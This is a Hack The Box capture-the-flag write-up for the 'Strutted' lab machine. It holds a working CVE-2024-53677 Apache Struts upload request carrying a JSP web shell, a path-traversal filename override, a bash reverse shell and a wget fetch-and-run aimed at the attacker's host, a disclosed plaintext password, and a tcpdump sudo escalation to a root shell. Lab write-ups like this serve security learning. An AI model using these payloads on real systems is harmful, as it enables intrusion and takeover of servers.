---
title: Hack The Box - Strutted
author: Jim Diroff II
description: "Strutted is an medium-difficulty Linux machine featuring a website for a company offering image hosting solutions."
image: "../assets/images/hackthebox-strutted-icon.png"
imageAlt: "A confident man in a green shirt struts against a backdrop of blue sky and clouds."
pubDate: 2025-05-22
tags: ["hackthebox", "ctf"]
---

# HackTheBox - Strutted

`Strutted` is an medium-difficulty Linux machine featuring a website for a company offering image hosting solutions. The website provides a Docker container with the version of Apache Struts that is vulnerable to `[CVE-2024-53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677)`, which is leveraged to gain a foothold on the system. Further enumeration reveals the `tomcat-users.xml` file with a plaintext password used to authenticate as `james`. For privilege escalation, we abuse `tcpdump` while being used with `sudo` to create a copy of the `bash` binary with the `SUID` bit set, allowing us to gain a `root` shell.

Target: `10.10.11.59`

## Recon

Scan with nmap. 22 and 80 are open.

The domain returned is `strutted.htb`. Added to hosts.

The website is a file sharing site, or more specifically, image hosting. Images can be uploaded, and then a link is provided that can be shared to view the image. The copy button doesn't actually work, but the URL can be seen in the source code.

The webserver shows nginx, but there is a `JSESSIONID` cookie, indicating Java.

There is a download button that downloads a copy of the website as a docker image.

It uses an OpenJDK container to build `strutted-1.0.0.war` using maven, then copies that into a Tomcat container with `tomcat-users.xml` and `context.xml`. A password is disclosed in `tomcat-users.xml`, but no identifiable way to use it.

In the `pom.xml` file, a version number for Apache Struts is disclosed, `6.3.0.1`. This version has a RCE CVE, `CVE-2024-53677`.

### Struts Vulnerablity

There is detail on this vulnerability on [Tanium](https://help.tanium.com/bundle/CVE-2024-31497/page/VERT/CVE-2024-53677/Understanding_Apache_Struts.htm). It explains _CVE-2024-53677 is a critical file upload vulnerability in the default Interceptor class (FileUploadInterceptor) of Struts 2_.

Struts has this concept of the object graph navigation library (OGNL), which has a stack. If there are two objects on the stack, and it allows referencing some property, say `name`, and that will work down the stack looking for the first object that has that property and return that.

If a POST request triggers the `FileUploadInterceptor`, I can have other POST parameters that reference parts of that object by the OGNL stack. This looks like this:

```http
POST /upload.action HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=---------------------------31959763281250412790357662404

-----------------------------31959763281250412790357662404
Content-Disposition: form-data; name="Upload"; filename="test.txt"
Content-Type: plaint/text

Hello, World!
-----------------------------31959763281250412790357662404
Content-Disposition: form-data; name="top.UploadFileName"

different.txt
-----------------------------31959763281250412790357662404--
```

The first form data parameter will be processed into an object by the FileUploadInterceptor. Then the second parameter is processed, setting the UploadFileName for the top of the stack (the first parameter) to this new value. This trick allows for bypassing other rules put in place about where a file can be written, including directory traversals.

> One critical thing I figured out through a lot of pain was that for the interceptor to handle the POST request, it must have the name “Upload” (with a capital “U”).
> {.is-info}

There are exploit scripts available, but this can also be done using Burp Repeater.

## Exploit

Upload an image file to the site and intercept the request. Remove the image data, except for the magic bytes, and replace it with some code to create a web shell. Then add a boundary layer that changes the file name. The web shell JSP script comes from [here](https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp)

```http
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundaryad3aaa391f7bd1319e7625a4711cbe95
Content-Length: 1214
Origin: http://strutted.htb
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://strutted.htb/
Cookie: JSESSIONID=018C3E6E788DE4F764E1385EC6F628FF
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundaryad3aaa391f7bd1319e7625a4711cbe95
Content-Disposition: form-data; name="Upload"; filename="TEST.jpg"
Content-Type: image/jpeg

ÿØÿà
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
                }
        }
%>
</pre>
</BODY></HTML>
------geckoformboundaryad3aaa391f7bd1319e7625a4711cbe95
Content-Disposition: form-data; name="top.UploadFileName"

../../shell.jsp
------geckoformboundaryad3aaa391f7bd1319e7625a4711cbe95--
```

This uploads the web shell and makes it available at `/shell.jsp`. There is an input box to enter commands.

Host a bash reverse shell script with Python, and use wget to copy the reverse shell to the target server.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

In the web shell (make sure python is running to host the script, and nc is running for execution of the script):

```bash
wget 10.10.14.10:8888/rev.sh -O /dev/shm/rev.sh

bash /dev/shm/rev.sh
```

## Lateral Movement

We are logged in as `tomcat`. There is a user named `james` with a shell.

In the `tomcat` home directory are the web application files. In `~/conf/tomcat-users.xml`, a password is disclosed.

```xml
<user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
```

This password works to login as `james` with SSH.

## Privilege Escalation

Running `sudo -l` shows that `james` can run `tcpdump` as `root`.

There is a `tcpdump` privesc POC on [GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/)

```
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

The following works to login as root:

```bash
james@strutted:~$ COMMAND='cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$ echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel

james@strutted:~$ ls -l /tmp/0xdf
-rwsrwsrwx 1 root root 1396520 Jan 26 21:44 /tmp/0xdf
james@strutted:~$ /tmp/0xdf -p
0xdf-5.1#
```
